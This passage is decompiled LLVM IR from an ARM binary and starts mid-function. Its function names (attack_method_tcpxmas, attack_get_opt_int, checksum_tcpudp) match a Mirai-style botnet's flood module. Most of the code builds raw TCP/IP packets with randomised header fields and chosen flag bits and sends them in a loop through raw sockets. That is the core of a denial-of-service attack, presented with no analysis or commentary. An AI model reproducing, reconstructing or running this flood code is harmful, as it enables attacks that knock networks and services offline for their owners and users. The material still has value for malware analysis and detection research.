  store i32 %v2_aa2c, i32* %r0.global-to-local, align 4
  %v3_aa30 = load i32, i32* @r4, align 4
  %v4_aa30 = add i32 %v3_aa30, 10
  %v5_aa30 = inttoptr i32 %v4_aa30 to i16*
  store i16 %v3_aa2c, i16* %v5_aa30, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_aa38 = load i32, i32* @r6, align 4
  %v3_aa38 = add i32 %v2_aa38, 6
  %v4_aa38 = inttoptr i32 %v3_aa38 to i16*
  store i16 0, i16* %v4_aa38, align 2
  %v0_aa3c = load i32, i32* @r6, align 4
  store i32 %v0_aa3c, i32* @r1, align 4
  %v1_aa40 = add i32 %v0_aa3c, 4
  %v2_aa40 = inttoptr i32 %v1_aa40 to i16*
  %v3_aa40 = load i16, i16* %v2_aa40, align 2
  %v4_aa40 = zext i16 %v3_aa40 to i32
  store i32 %v4_aa40, i32* %r2.global-to-local, align 4
  %v0_aa44 = load i32, i32* @sb, align 4
  store i32 %v0_aa44, i32* %r3.global-to-local, align 4
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %r0.global-to-local, align 4
  %v4_aa4c = call i32 @checksum_tcpudp(i32 %v0_aa48, i32 %v0_aa3c, i32 %v4_aa40, i32 %v0_aa44)
  %v5_aa4c = trunc i32 %v4_aa4c to i16
  store i32 %v4_aa4c, i32* %r0.global-to-local, align 4
  %v3_aa50 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa50, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_aa58 = mul i32 %v3_aa50, 32
  store i32 %v3_aa58, i32* %ip.global-to-local, align 4
  %v3_aa5c = load i32, i32* @r6, align 4
  %v4_aa5c = add i32 %v3_aa5c, 6
  %v5_aa5c = inttoptr i32 %v4_aa5c to i16*
  store i16 %v5_aa4c, i16* %v5_aa5c, align 2
  %v0_aa60 = load i32, i32* %ip.global-to-local, align 4
  %v1_aa60 = load i32, i32* %r3.global-to-local, align 4
  %tmp128 = mul i32 %v1_aa60, -8
  %v5_aa60 = add i32 %v0_aa60, %tmp128
  store i32 %v5_aa60, i32* %ip.global-to-local, align 4
  %v0_aa64 = load i32, i32* @r6, align 4
  %v1_aa64 = add i32 %v0_aa64, 2
  %v2_aa64 = inttoptr i32 %v1_aa64 to i16*
  %v3_aa64 = load i16, i16* %v2_aa64, align 2
  %v4_aa64 = zext i16 %v3_aa64 to i32
  store i32 %v4_aa64, i32* @r6, align 4
  %v1_aa68 = load i32, i32* @lr, align 4
  %v2_aa68 = add i32 %v1_aa68, %v5_aa60
  store i32 %v2_aa68, i32* %ip.global-to-local, align 4
  %v3_aa6c = add i32 %v2_aa68, 2
  %v4_aa6c = inttoptr i32 %v3_aa6c to i16*
  store i16 %v3_aa64, i16* %v4_aa6c, align 2
  %v0_aa70 = load i32, i32* @fp, align 4
  %v1_aa70 = load i32, i32* %ip.global-to-local, align 4
  %v2_aa70 = add i32 %v1_aa70, 4
  %v3_aa70 = inttoptr i32 %v2_aa70 to i32*
  store i32 %v0_aa70, i32* %v3_aa70, align 4
  %v0_aa74 = load i32, i32* @r4, align 4
  store i32 %v0_aa74, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v0_aa80 = load i32, i32* @sl, align 4
  store i32 %v0_aa80, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_aa88 = load i32, i32* %ip.global-to-local, align 4
  %v6_aa90 = call i32 @__libc_sendto(i32 %v3_a728, i32 %v0_aa74, i32 %v0_aa80, i32 16384, i32 %v0_aa88, i32 16)
  %v3_aa94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa94, i32* %r3.global-to-local, align 4
  %v1_aa98 = add i32 %v3_aa94, 1
  store i32 %v1_aa98, i32* %r0.global-to-local, align 4
  %v0_aa9c = load i32, i32* @r8, align 4
  %v9_aa9c = icmp eq i32 %v0_aa9c, %v1_aa98
  store i1 %v9_aa9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_aa98, i32* %stack_var_-44, align 4
  %v8_aaa4 = icmp sgt i32 %v0_aa9c, %v1_aa98
  br i1 %v8_aaa4, label %dec_label_pc_a9cc, label %dec_label_pc_aaa8

dec_label_pc_aaa8:                                ; preds = %dec_label_pc_aa10
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_aaac = icmp eq i32 %v0_aa9c, 0
  store i1 %v2_aaac, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aaac, label %dec_label_pc_a9b0, label %dec_label_pc_a9c0

dec_label_pc_aabc:                                ; preds = %dec_label_pc_a9cc
  %v0_aabc = call i32 @rand_next()
  %v1_aabc = trunc i32 %v0_aabc to i16
  store i32 %v0_aabc, i32* %r0.global-to-local, align 4
  store i32 %v3_a78c, i32* @lr, align 4
  %v1_aac4 = load i32, i32* @r5, align 4
  %v9_aac4 = icmp eq i32 %v3_a78c, %v1_aac4
  store i1 %v9_aac4, i1* %cpsr_z.global-to-local, align 1
  %v3_aac8 = load i32, i32* @r4, align 4
  %v4_aac8 = add i32 %v3_aac8, 4
  %v5_aac8 = inttoptr i32 %v4_aac8 to i16*
  store i16 %v1_aabc, i16* %v5_aac8, align 2
  br i1 %v9_aac4, label %dec_label_pc_aad0, label %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge

dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge:    ; preds = %dec_label_pc_aabc
  %v1_a9fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a9f8

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aabc, %dec_label_pc_a9ec
  %v0_aad0 = call i32 @rand_next()
  %v1_aad0 = trunc i32 %v0_aad0 to i16
  %v3_aad4 = load i32, i32* @r4, align 4
  %v4_aad4 = add i32 %v3_aad4, 20
  %v5_aad4 = inttoptr i32 %v4_aad4 to i16*
  store i16 %v1_aad0, i16* %v5_aad4, align 2
  store i32 %v3_a7a8, i32* %r0.global-to-local, align 4
  %v1_aadc = load i32, i32* @r5, align 4
  %v9_aadc = icmp eq i32 %v3_a7a8, %v1_aadc
  store i1 %v9_aadc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aadc, label %dec_label_pc_aae4, label %dec_label_pc_aa04

dec_label_pc_aae4:                                ; preds = %dec_label_pc_aad0, %dec_label_pc_a9f8
  %v0_aae4 = call i32 @rand_next()
  %v1_aae4 = trunc i32 %v0_aae4 to i16
  store i32 %v0_aae4, i32* %r0.global-to-local, align 4
  store i32 %v3_a7b0, i32* %r2.global-to-local, align 4
  %v1_aaec = load i32, i32* @r5, align 4
  %v9_aaec = icmp eq i32 %v3_a7b0, %v1_aaec
  store i1 %v9_aaec, i1* %cpsr_z.global-to-local, align 1
  %v3_aaf0 = load i32, i32* @r6, align 4
  %v4_aaf0 = add i32 %v3_aaf0, 2
  %v5_aaf0 = inttoptr i32 %v4_aaf0 to i16*
  store i16 %v1_aae4, i16* %v5_aaf0, align 2
  br i1 %v9_aaec, label %dec_label_pc_aaf8, label %dec_label_pc_aa10

dec_label_pc_aaf8:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_aa04
  %v0_aaf8 = call i32 @rand_next()
  %v1_aaf8 = trunc i32 %v0_aaf8 to i16
  store i32 %v0_aaf8, i32* %r0.global-to-local, align 4
  %v3_aafc = load i32, i32* @r4, align 4
  %v4_aafc = add i32 %v3_aafc, 28
  %v5_aafc = inttoptr i32 %v4_aafc to i16*
  store i16 %v1_aaf8, i16* %v5_aafc, align 2
  br label %dec_label_pc_aa10

dec_label_pc_ab04:                                ; preds = %dec_label_pc_a690, %dec_label_pc_a670, %dec_label_pc_a614, %entry
  %v0_ab04 = call i32 @rand_next()
  %v1_ab08 = urem i32 %v0_ab04, 4
  store i32 %v1_ab08, i32* %r0.global-to-local, align 4
  %v2_ab0c = icmp eq i32 %v1_ab08, 3
  store i1 %v2_ab0c, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_ab04 to i2
  switch i2 %trunc, label %dec_label_pc_a70811 [
    i2 0, label %dec_label_pc_ab40
    i2 1, label %dec_label_pc_ab6c
    i2 -2, label %dec_label_pc_ab60
    i2 -1, label %dec_label_pc_ab50
  ]

dec_label_pc_ab28:                                ; preds = %dec_label_pc_a738
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v1_ab2c = call i32 @__GI___libc_close(i32 %v3_a728)
  store i32 %v1_ab2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ab30

dec_label_pc_ab30:                                ; preds = %dec_label_pc_a710, %dec_label_pc_a708, %dec_label_pc_ab28
  %v1_ab3c = phi i32 [ %v3_a728, %dec_label_pc_a710 ], [ %v1_ab3c49, %dec_label_pc_a708 ], [ %v1_ab2c, %dec_label_pc_ab28 ]
  store i32 %v18_a4c0, i32* %sb.global-to-local, align 4
  store i32 %v27_a4c0, i32* %lr.global-to-local, align 4
  ret i32 %v1_ab3c

dec_label_pc_ab40:                                ; preds = %dec_label_pc_ab04
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab50:                                ; preds = %dec_label_pc_ab04
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab60:                                ; preds = %dec_label_pc_ab04
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab6c:                                ; preds = %dec_label_pc_ab04
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_a708

; uselistorder directives
  uselistorder i32 %v1_ab08, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_ab04, { 1, 0 }
  uselistorder i32 %v0_aaf8, { 1, 0 }
  uselistorder i32 %v0_aae4, { 1, 0 }
  uselistorder i32 %v1_aadc, { 1, 0 }
  uselistorder i32 %v0_aabc, { 1, 0 }
  uselistorder i32 %v1_aa98, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_aa60, { 1, 0 }
  uselistorder i32 %v4_aa4c, { 1, 0 }
  uselistorder i32 %v2_aa2c, { 1, 0 }
  uselistorder i1 %v3_a9f0, { 1, 0 }
  uselistorder i1 %v3_a9e0, { 1, 0 }
  uselistorder i32 %v4_aa14.pre-phi, { 1, 0 }
  uselistorder i32 %v1_a988, { 1, 0, 2 }
  uselistorder i32 %v0_a978, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_a964, { 2, 0, 3, 1 }
  uselistorder i32 %v0_a960, { 1, 0, 2 }
  uselistorder i32 %v0_a8d0, { 1, 0 }
  uselistorder i32 %v4_a8cc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp111, { 1, 0 }
  uselistorder i32 %v3_a818, { 1, 0 }
  uselistorder i32 %v3_a7d4, { 1, 0 }
  uselistorder i32 %v1_a7c8, { 2, 0, 1 }
  uselistorder i32 %v3_a794, { 1, 0 }
  uselistorder i32 %v3_a78c, { 1, 2, 3, 5, 0, 4 }
  uselistorder i32 %v3_a784, { 0, 2, 1 }
  uselistorder i8 %v5_a77c, { 1, 0, 2 }
  uselistorder i32 %v1_a768, { 1, 0 }
  uselistorder i32 %v0_a768, { 1, 0 }
  uselistorder i1 %v7_a758, { 1, 0 }
  uselistorder i1 %v7_a72c, { 1, 0 }
  uselistorder i32 %v3_a728, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_a708, { 1, 0, 2 }
  uselistorder i32 %v2_a6d8, { 0, 1, 3, 2 }
  uselistorder i32 %v2_a6d4, { 1, 0, 2 }
  uselistorder i1 %v7_a6c4, { 1, 0 }
  uselistorder i32 %v1_a6c0, { 1, 0, 2 }
  uselistorder i1 %v8_a6b8, { 1, 0 }
  uselistorder i1 %v7_a6b4, { 1, 0 }
  uselistorder i32 %v1_a6a8, { 1, 0 }
  uselistorder i8 %v2_a69c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_a6a0, { 1, 0 }
  uselistorder i32 %v0_a6c0, { 3, 0, 2, 1 }
  uselistorder i32 %v0_a690, { 0, 2, 1 }
  uselistorder i32 %v1_a6a4, { 0, 2, 1 }
  uselistorder i32 %v2_a678, { 1, 0, 2, 3 }
  uselistorder i32 %v0_a670, { 1, 0, 2, 3 }
  uselistorder i1 %v7_a668, { 1, 0 }
  uselistorder i32 %v0_a668, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_a60c, { 1, 0, 3, 2 }
  uselistorder i32 %v6_a5ac, { 1, 0, 2, 3 }
  uselistorder i32 %v6_a590, { 1, 0, 2, 3 }
  uselistorder i32 %v6_a578, { 2, 1, 0 }
  uselistorder i32 %v1_a560, { 1, 0 }
  uselistorder i32 %v7_a51c, { 1, 0, 2 }
  uselistorder i32 %v2_a4e0, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %sb.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 34, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 35, 34, 36, 38, 37, 40, 39, 0 }
  uselistorder i32* %r0.global-to-local, { 56, 54, 55, 57, 58, 1, 3, 2, 4, 6, 5, 7, 8, 9, 11, 10, 14, 12, 13, 15, 16, 21, 17, 18, 19, 20, 25, 22, 23, 24, 26, 28, 27, 29, 30, 31, 32, 34, 33, 35, 36, 38, 37, 39, 41, 40, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i1* %cpsr_z.global-to-local, { 29, 30, 31, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 23, 24, 25, 22, 19, 26, 27, 28 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ab30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aa10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9c0, { 1, 0 }
  uselistorder label %dec_label_pc_a9b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a9b0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_a980, { 1, 0 }
  uselistorder label %.thread20, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %dec_label_pc_a6d0, { 1, 0 }
  uselistorder label %dec_label_pc_a6c4, { 1, 0 }
  uselistorder label %dec_label_pc_a690, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a688, { 1, 0 }
}

define i32 @attack_method_tcpxmas(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_ab7c = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_ab98 = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_aba4 = load i32, i32* @r6, align 4
  store i32 %v0_aba4, i32* %r0.global-to-local, align 4
  %v2_aba8 = call i32 @calloc(i32 %v0_aba4, i32 4)
  %v0_abac = load i32, i32* @r5, align 4
  store i32 %v0_abac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_abbc = load i32, i32* @r4, align 4
  store i32 %v0_abbc, i32* %r0.global-to-local, align 4
  %v5_abc0 = inttoptr i32 %v0_abac to i32*
  %v6_abc0 = call i32 @attack_get_opt_int(i32 %v0_abbc, i32* %v5_abc0, i32 2, i32 0)
  %v1_abcc = urem i32 %v6_abc0, 256
  store i32 %v1_abcc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_abd8 = load i32, i32* @r5, align 4
  store i32 %v0_abd8, i32* %r1.global-to-local, align 4
  %v0_abdc = load i32, i32* @r4, align 4
  store i32 %v0_abdc, i32* %r0.global-to-local, align 4
  %v5_abe0 = trunc i32 %v6_abc0 to i8
  %v6_abe4 = inttoptr i32 %v0_abd8 to i32*
  %v7_abe4 = call i32 @attack_get_opt_int(i32 %v0_abdc, i32* %v6_abe4, i32 3, i32 65535)
  %v0_abe8 = load i32, i32* @r5, align 4
  store i32 %v0_abe8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_abe4, i32* @r7, align 4
  %v0_abf8 = load i32, i32* @r4, align 4
  store i32 %v0_abf8, i32* %r0.global-to-local, align 4
  %v4_abfc = inttoptr i32 %v0_abe8 to i32*
  %v5_abfc = call i32 @attack_get_opt_int(i32 %v0_abf8, i32* %v4_abfc, i32 4, i32 64)
  %v1_ac04 = urem i32 %v5_abfc, 256
  store i32 %v1_ac04, i32* %ip.global-to-local, align 4
  %v0_ac08 = load i32, i32* @r5, align 4
  store i32 %v0_ac08, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac14 = load i32, i32* @r4, align 4
  store i32 %v0_ac14, i32* %r0.global-to-local, align 4
  %v6_ac1c = inttoptr i32 %v0_ac08 to i32*
  %v7_ac1c = call i32 @attack_get_opt_int(i32 %v0_ac14, i32* %v6_ac1c, i32 5, i32 1)
  %v1_ac28 = urem i32 %v7_ac1c, 256
  store i32 %v1_ac28, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_ac30 = load i32, i32* @r5, align 4
  store i32 %v0_ac30, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_ac38 = load i32, i32* @r4, align 4
  store i32 %v0_ac38, i32* %r0.global-to-local, align 4
  %v5_ac40 = inttoptr i32 %v0_ac30 to i32*
  %v6_ac40 = call i32 @attack_get_opt_int(i32 %v0_ac38, i32* %v5_ac40, i32 7, i32 65535)
  %v0_ac44 = load i32, i32* @r5, align 4
  store i32 %v0_ac44, i32* %r1.global-to-local, align 4
  %v3_ac48 = mul i32 %v6_ac40, 65536
  store i32 %v3_ac48, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac54 = load i32, i32* @r4, align 4
  store i32 %v0_ac54, i32* %r0.global-to-local, align 4
  %v3_ac58 = urem i32 %v6_ac40, 65536
  store i32 %v3_ac58, i32* @sl, align 4
  %v4_ac5c = inttoptr i32 %v0_ac44 to i32*
  %v5_ac5c = call i32 @attack_get_opt_int(i32 %v0_ac54, i32* %v4_ac5c, i32 11, i32 1)
  %v1_ac64 = urem i32 %v5_ac5c, 256
  store i32 %v1_ac64, i32* %ip.global-to-local, align 4
  %v0_ac68 = load i32, i32* @r5, align 4
  store i32 %v0_ac68, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac74 = load i32, i32* @r4, align 4
  store i32 %v0_ac74, i32* %r0.global-to-local, align 4
  %v5_ac7c = inttoptr i32 %v0_ac68 to i32*
  %v6_ac7c = call i32 @attack_get_opt_int(i32 %v0_ac74, i32* %v5_ac7c, i32 12, i32 1)
  %v1_ac84 = urem i32 %v6_ac7c, 256
  store i32 %v1_ac84, i32* %ip.global-to-local, align 4
  %v0_ac88 = load i32, i32* @r5, align 4
  store i32 %v0_ac88, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac94 = load i32, i32* @r4, align 4
  store i32 %v0_ac94, i32* %r0.global-to-local, align 4
  %v5_ac9c = inttoptr i32 %v0_ac88 to i32*
  %v6_ac9c = call i32 @attack_get_opt_int(i32 %v0_ac94, i32* %v5_ac9c, i32 13, i32 1)
  %v1_aca4 = urem i32 %v6_ac9c, 256
  store i32 %v1_aca4, i32* %ip.global-to-local, align 4
  %v0_aca8 = load i32, i32* @r5, align 4
  store i32 %v0_aca8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acb4 = load i32, i32* @r4, align 4
  store i32 %v0_acb4, i32* %r0.global-to-local, align 4
  %v5_acbc = inttoptr i32 %v0_aca8 to i32*
  %v6_acbc = call i32 @attack_get_opt_int(i32 %v0_acb4, i32* %v5_acbc, i32 14, i32 1)
  %v1_acc4 = urem i32 %v6_acbc, 256
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  %v0_acc8 = load i32, i32* @r5, align 4
  store i32 %v0_acc8, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acd4 = load i32, i32* @r4, align 4
  store i32 %v0_acd4, i32* %r0.global-to-local, align 4
  %v5_acdc = inttoptr i32 %v0_acc8 to i32*
  %v6_acdc = call i32 @attack_get_opt_int(i32 %v0_acd4, i32* %v5_acdc, i32 15, i32 1)
  %v1_ace4 = urem i32 %v6_acdc, 256
  store i32 %v1_ace4, i32* %ip.global-to-local, align 4
  %v0_ace8 = load i32, i32* @r5, align 4
  store i32 %v0_ace8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acf4 = load i32, i32* @r4, align 4
  store i32 %v0_acf4, i32* %r0.global-to-local, align 4
  %v5_acfc = inttoptr i32 %v0_ace8 to i32*
  %v6_acfc = call i32 @attack_get_opt_int(i32 %v0_acf4, i32* %v5_acfc, i32 16, i32 1)
  %v1_ad04 = urem i32 %v6_acfc, 256
  store i32 %v1_ad04, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_ad10 = load i32, i32* @r5, align 4
  store i32 %v0_ad10, i32* %r1.global-to-local, align 4
  %v0_ad14 = load i32, i32* @r4, align 4
  store i32 %v0_ad14, i32* %r0.global-to-local, align 4
  %v5_ad1c = inttoptr i32 %v0_ad10 to i32*
  %v6_ad1c = call i32 @attack_get_opt_int(i32 %v0_ad14, i32* %v5_ad1c, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ad2c = load i32, i32* @r5, align 4
  store i32 %v0_ad2c, i32* %r1.global-to-local, align 4
  %v0_ad30 = load i32, i32* @r4, align 4
  store i32 %v0_ad30, i32* %r0.global-to-local, align 4
  %v4_ad34 = inttoptr i32 %v0_ad2c to i32*
  %v5_ad34 = call i32 @attack_get_opt_int(i32 %v0_ad30, i32* %v4_ad34, i32 1, i32 1)
  %v1_ad3c = urem i32 %v5_ad34, 256
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_ad50 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_ad50, i32* %r0.global-to-local, align 4
  %v7_ad54 = icmp eq i32 %v3_ad50, -1
  store i1 %v7_ad54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ad50, i32* @sb, align 4
  br i1 %v7_ad54, label %dec_label_pc_af44, label %dec_label_pc_ad60

dec_label_pc_ad60:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_ad68 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_ad68, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ad7c = call i32 @__GI_setsockopt(i32 %v3_ad50, i32 0, i32 3, i32 %v6_ad68, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ad7c, i32* %r0.global-to-local, align 4
  %v7_ad80 = icmp eq i32 %v5_ad7c, -1
  store i1 %v7_ad80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad80, label %dec_label_pc_af3c, label %dec_label_pc_ad88

dec_label_pc_ad88:                                ; preds = %dec_label_pc_ad60
  %v0_ad88 = load i32, i32* @r7, align 4
  %v3_ad88 = mul i32 %v0_ad88, 65536
  store i32 %v3_ad88, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_ad90 = load i32, i32* @r6, align 4
  %v2_ad90 = icmp eq i32 %v0_ad90, 0
  store i1 %v2_ad90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_ad98 = urem i32 %v0_ad88, 65536
  store i32 %v3_ad98, i32* @fp, align 4
  br i1 %v2_ad90, label %dec_label_pc_b1c8, label %dec_label_pc_ada0.preheader

dec_label_pc_ada0.preheader:                      ; preds = %dec_label_pc_ad88
  %v2_adec = ptrtoint i32* %stack_var_-144 to i32
  %v2_ae30 = ptrtoint i32* %stack_var_-64 to i32
  %v2_ae68 = ptrtoint i32* %stack_var_-80 to i32
  %v2_ae74 = ptrtoint i32* %stack_var_-336 to i32
  %v2_ae78 = ptrtoint i32* %stack_var_-48 to i32
  %v4_aed8 = zext i8 %tmp to i32
  %v1_aedc = and i32 %v4_aed8, 18
  %v2_aee0 = icmp eq i32 %v1_aedc, 18
  %v4_b084 = sext i8 %v5_abe0 to i32
  %sext = mul i32 %v5_abfc, 16777216
  %v4_b094 = sdiv i32 %sext, 16777216
  %v3_aec4 = sext i16 %tmp61 to i32
  %v1_aee8 = and i32 %v4_aed8, 5
  %v2_aee8 = icmp eq i32 %v1_aee8, 0
  %v4_ae28 = add i32 %v2_adec, 82
  %v5_ae28 = inttoptr i32 %v4_ae28 to i16*
  %v1_b018 = add i32 %v6_ad1c, 40
  %v1_b12c = urem i32 %v5_ac5c, 2
  %tmp97 = sub nsw i32 0, %v1_b12c
  %v4_b134 = and i32 %tmp97, 32
  %v1_b144 = urem i32 %v6_ac7c, 2
  %tmp98 = sub nsw i32 0, %v1_b144
  %v4_b14c = and i32 %tmp98, 16
  %v1_b15c = urem i32 %v6_ac9c, 2
  %tmp99 = sub nsw i32 0, %v1_b15c
  %v4_b164 = and i32 %tmp99, 8
  %v1_b174 = urem i32 %v6_acbc, 2
  %tmp100 = sub nsw i32 0, %v1_b174
  %v4_b17c = and i32 %tmp100, 4
  %v1_b18c = urem i32 %v6_acdc, 2
  %tmp101 = sub nsw i32 0, %v1_b18c
  %v3_b194 = and i32 %tmp101, 2
  %v1_b1a4 = urem i32 %v6_acfc, 2
  br label %dec_label_pc_ada0

dec_label_pc_ada0:                                ; preds = %dec_label_pc_ada0.preheader, %dec_label_pc_af14
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_af14 ], [ %tmp34, %dec_label_pc_ada0.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_af14 ], [ %tmp37, %dec_label_pc_ada0.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_adac = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_adac, i32* %r0.global-to-local, align 4
  %v7_adb0 = icmp eq i32 %v3_adac, -1
  store i1 %v7_adb0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_adac, i32* @r5, align 4
  br i1 %v7_adb0, label %dec_label_pc_af14, label %dec_label_pc_adbc

